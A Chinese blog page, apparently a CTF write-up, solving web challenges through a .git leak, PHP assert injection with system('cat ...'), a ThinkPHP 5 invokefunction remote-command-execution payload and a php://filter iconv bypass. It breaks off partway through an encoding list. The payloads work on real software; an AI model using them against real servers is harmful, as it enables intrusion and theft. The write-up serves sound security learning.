@@ -1,0 +1,641 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="notbad3">
+  <meta name="keywords" content="the quieter you become,the more you can hear">
+  
+    <meta name="description" content="做题记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup_2022 NewstarCTF_Week1(Web部分)">
+<meta property="og:url" content="http://example.com/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/index.html">
+<meta property="og:site_name" content="rdj&#39;s Blog">
+<meta property="og:description" content="做题记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/b5.png">
+<meta property="og:image" content="http://example.com/img/b6.png">
+<meta property="og:image" content="http://example.com/img/b7.png">
+<meta property="og:image" content="http://example.com/img/b8.png">
+<meta property="og:image" content="http://example.com/img/b9.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902182614238-883024157.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902193727121-429631782.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200111760-1487399677.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200144506-2129745043.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200315231-1913861343.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200424907-1518032191.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200658223-1816441800.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200800369-192377013.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902201445887-2027647501.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180701730-2096930147.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180953978-745219457.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191411125-1673822326.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191442857-1708949819.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191453864-1253755233.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192129048-1514343739.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192145289-1200878021.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093450823-256892203.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093541288-1989671347.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093749742-1998449790.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093907037-1988636454.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904094304564-1249635122.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904100428721-1887388885.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102026887-1995512140.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102245157-1804309849.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110040442-185642157.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110103088-327207158.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121505457-2065669123.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121727159-1447658532.png">
+<meta property="article:published_time" content="2023-09-11T12:08:50.000Z">
+<meta property="article:modified_time" content="2023-10-22T10:59:14.177Z">
+<meta property="article:author" content="notbad3">
+<meta property="article:tag" content="the quieter you become,the more you can hear">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/b5.png">
+  
+  
+  
+  <title>Writeup_2022 NewstarCTF_Week1(Web部分) - rdj&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>notbad3</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Writeup_2022 NewstarCTF_Week1(Web部分)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-11 20:08" pubdate>
+          2023年9月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          84 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Writeup_2022 NewstarCTF_Week1(Web部分)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>做题记录</p>
+<span id="more"></span>
+
+<hr>
+<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><strong>mfw</strong></h2><p>进入环境:<br><img src="/img/b5.png" srcset="/img/loading.gif" lazyload alt="b5"><br>点下上面的链接看看结果About：<br><img src="/img/b6.png" srcset="/img/loading.gif" lazyload alt="b6"><br>里面有个Git,想到了Git泄露,直接看下.git文件有没有：<br><img src="/img/b7.png" srcset="/img/loading.gif" lazyload alt="b7"><br>上GitHack：<br><code>python GitHack.py http://61.147.171.105:55455/.git/</code><br><img src="/img/b8.png" srcset="/img/loading.gif" lazyload alt="b8"><br>访问一下，看有没有啥好东西：<br>flag.php里啥也没有，可惜：<br><img src="/img/b9.png" srcset="/img/loading.gif" lazyload alt="b9"><br>看下index.php,里面有不少好东西，把有用的php部分拿出来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>	<span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>首先GET方式传page，不给page赋值的话自动等于home(就是我们进去看到的首页)，然后进行一个拼接：templates&#x2F;$page.php，把这东西给$file。assert这东西叫“断言检查”，意思是如果里面的条件是真，就会接着执行后面的函数require_once，这东西有点点像include包含，至于直接包含某个文件，不用伪协议啥的我一直把它理解成执行该文件，哈哈。<br>接下来的思路就是构造page让他执行一些命令比如’ls’ ‘cat’啥的。<br>接下来的payload参考了这位师傅的文章，感谢！：<br><code>https://blog.csdn.net/m0_62063669/article/details/125427751?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169364331616800186574360%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169364331616800186574360&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125427751-null-null.142^v93^koosearch_v1&amp;utm_term=mfw&amp;spm=1018.2226.3001.4187</code><br>payloaad:<br><code>index.php/?page=flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag</code><br>解释下为什么要给page赋这么一个值，先看这个page让file成了个啥东西：<br><code>file = template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php</code><br>带到断言函数中：<br><code>assert(&quot;strpos(&#39;template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</code></p>
+<p>strpos函数是看参数里有没有要检测的值，有的话返回第一次出现的位置，没有就返回false。明显 ‘template&#x2F;flag’这里面没abc，第一个assert为真；第二个执行 cat templates&#x2F;flag.php ，这没啥好说的，就是去拿我们要的flag，不过注意cat后的文件路径。我们当前在index.php下，index.php和templates同目录，flag.php又在templates下。所以相对路径就是<code>templates/flag.php</code>。最后一个断言是找flag.php中有没有俩点，没有返回false。因为是两个and连接，三个条件都为真即为真。然后直接require($file)，执行命令。<br>flag藏在源码里：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902182614238-883024157.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a><strong>php_rce</strong></h2><p>进入环境：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902193727121-429631782.png" srcset="/img/loading.gif" lazyload alt="image"><br>Github搜下有关这个ThinkPHPV5的相关漏洞，发现有一大堆远程命令执行的POC：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200111760-1487399677.png" srcset="/img/loading.gif" lazyload alt="image"><br>找个长的试试：<br><code>s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1</code><br>执行了phpinfo()这个命令<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200144506-2129745043.png" srcset="/img/loading.gif" lazyload alt="image"><br>ls看下当前目录下的文件：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200315231-1913861343.png" srcset="/img/loading.gif" lazyload alt="image"><br>没有和flag有关的东西，等会用find找一下，不过这里有个和爬虫有关的robots.txt，让我看看你：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200424907-1518032191.png" srcset="/img/loading.gif" lazyload alt="image"><br>可惜啥也没有，find命令找下和flag有关的东西：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find /%20 -name &quot;flag*&quot;</code><br>find是全磁盘查找所以可能会比较慢：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200658223-1816441800.png" srcset="/img/loading.gif" lazyload alt="image"><br>草了，还是看看根目录下都啥东西吧：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200800369-192377013.png" srcset="/img/loading.gif" lazyload alt="image"><br>有个flag: ls &#x2F;flag没啥有价值的东西，直接 cat &#x2F;flag读一下：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902201445887-2027647501.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<h2 id="题目名称-文件包含"><a href="#题目名称-文件包含" class="headerlink" title="题目名称-文件包含"></a><strong>题目名称-文件包含</strong></h2><h2 id="进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb"><a href="#进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert.iconv.UTF-8*.UCS-4BE.resource=./check.php这种类型的过滤器，那就试试这个：?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:[网鼎杯 2020 朱雀组]phpweb"></a>进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180701730-2096930147.png" srcset="/img/loading.gif" lazyload alt="image"><br>回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了<br><code>convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br>这种类型的过滤器，那就试试这个：<br><code>?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180953978-745219457.png" srcset="/img/loading.gif" lazyload alt="image"><br>过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br>    <span class="hljs-attribute">UTF7</span>-IMAP<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ASCII</span>*<br>    <span class="hljs-attribute">EUC</span>-JP*<br>    <span class="hljs-attribute">SJIS</span>*<br>    <span class="hljs-attribute">eucJP</span>-win*<br>    <span class="hljs-attribute">SJIS</span>-win*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<br>    <span class="hljs-attribute">CP932</span><br>    <span class="hljs-attribute">CP51932</span><br>    <span class="hljs-attribute">SJIS</span>-mac（别名：MacJapanese）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO（别名：SJIS-DOCOMO）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#KDDI（别名：SJIS-KDDI）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO（别名：UTF-<span class="hljs-number">8</span>-DOCOMO）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B（别名：UTF-<span class="hljs-number">8</span>-KDDI）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK（别名：UTF-<span class="hljs-number">8</span>-SOFTBANK）<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI（别名：ISO-<span class="hljs-number">2022</span>-JP-KDDI）<br>    <span class="hljs-attribute">JIS</span><br>    <span class="hljs-attribute">JIS</span>-ms<br>    <span class="hljs-attribute">CP50220</span><br>    <span class="hljs-attribute">CP50220raw</span><br>    <span class="hljs-attribute">CP50221</span><br>    <span class="hljs-attribute">CP50222</span><br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">byte2be</span><br>    <span class="hljs-attribute">byte2le</span><br>    <span class="hljs-attribute">byte4be</span><br>    <span class="hljs-attribute">byte4le</span><br>    <span class="hljs-attribute">BASE64</span><br>    <span class="hljs-attribute">HTML</span>-ENTITIES（别名：HTML）<br>    <span class="hljs-attribute">7bit</span><br>    <span class="hljs-attribute">8bit</span><br>    <span class="hljs-attribute">EUC</span>-CN*<br>    <span class="hljs-attribute">CP936</span><br>    <span 